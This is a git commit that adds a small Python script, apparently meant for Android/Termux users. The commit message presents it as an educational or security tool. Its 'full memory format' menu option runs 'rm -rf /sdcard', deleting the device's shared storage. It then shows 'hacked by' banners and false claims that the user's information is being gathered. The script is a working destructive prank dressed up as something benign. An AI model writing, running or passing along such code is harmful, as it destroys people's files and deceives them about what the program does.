ac745821f0e0c86575b86dca10e9f92c7ef083a2
FÆÎSAL  DA4K E63 <78696114+DA4kE63@users.noreply.github.com>
2021-02-10 15:05:36 +0600

    Faisal dark eye
    This for just educationn and  this tool for secur all virus 
    Guys im one biginer guys sorry for my bad tools

---
+++ 1virus.py
@@ -0,0 +1,54 @@
+import os
+os.sys
+import time
+import sys
+os.system("clear")
+logo = """
+
+\033[1;93m  _______       ___     _  _     __  ___     _______    __    ____   
+\033[1;93m|       \     /   \   | || |   |  |/  /    |   ____|  / /   |___
+\033[1;93m
+\033[1;93m|  .--.  |   /  ^  \  | || |_  |  '  /     |  |__    / /_     __) | 
+\033[1;93m|     |  |  /  /_\  \ |__   _| |    <      |   __|  | '_ \   |__ <  
+\033[1;93m||  '--'  | /  _____  \   | |   |  .  \     |  |____ | (_) |  ___) | 
+\033[1;93m||_______/ /__/     \__\  |_|   |__|\__\    |_______| \___/  |____/  
+                                                                    
+             
+
+"""
+def logop(z):
+    for word  in z + '\n':
+        sys.stdout.write(word)
+        sys.stdout.flush()
+        time.sleep(0.01)
+logop(logo)
+
+os.system("figlet welcome to my tool ")
+n= "hacked by DA4K E63"
+sys.stdout.write(n)
+sys.stdout.flush()
+time.sleep(5)
+print(n)
+print("""
+[1]full memory format
+[2]set one virus """)
+
+option = input("enter your choice")
+if option == "1":
+    i = 1 
+    while i <= 1 :
+        os.system("cd /sdcard")
+        os.system("ls")
+        os.system("rm -rf /sdcard")
+        os.system("apt install sl")
+        os.system("sl")
+        os.system("clear")
+        os.system("figlet Hacked by DA4k E63")
+        i = i + 1
+elif option ==  "2":
+    print("comming soon")
+else:
+    print(" you option field")
+print("you are now hacked")
+print("your all information gethering ")
+print("hacked by DA4K E63")
